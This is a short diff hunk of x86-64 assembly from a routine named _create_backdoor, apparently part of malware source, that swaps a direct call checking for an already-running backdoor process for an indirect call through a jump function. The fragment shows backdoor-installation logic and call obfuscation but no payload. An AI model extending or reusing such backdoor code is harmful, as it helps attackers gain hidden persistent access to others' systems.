@@ -31,7 +31,9 @@ _create_backdoor:
 
 ; First check if a backdoor is not already running
 	lea rdi, [rel _script_file.verif_proc_name]
-	call _checkproc
+	mov r12, 0x0000000000000000
+	call _jump_to_function
+;	call _checkproc
 	cmp rax, 0
 	jne _backdoor_ret
 
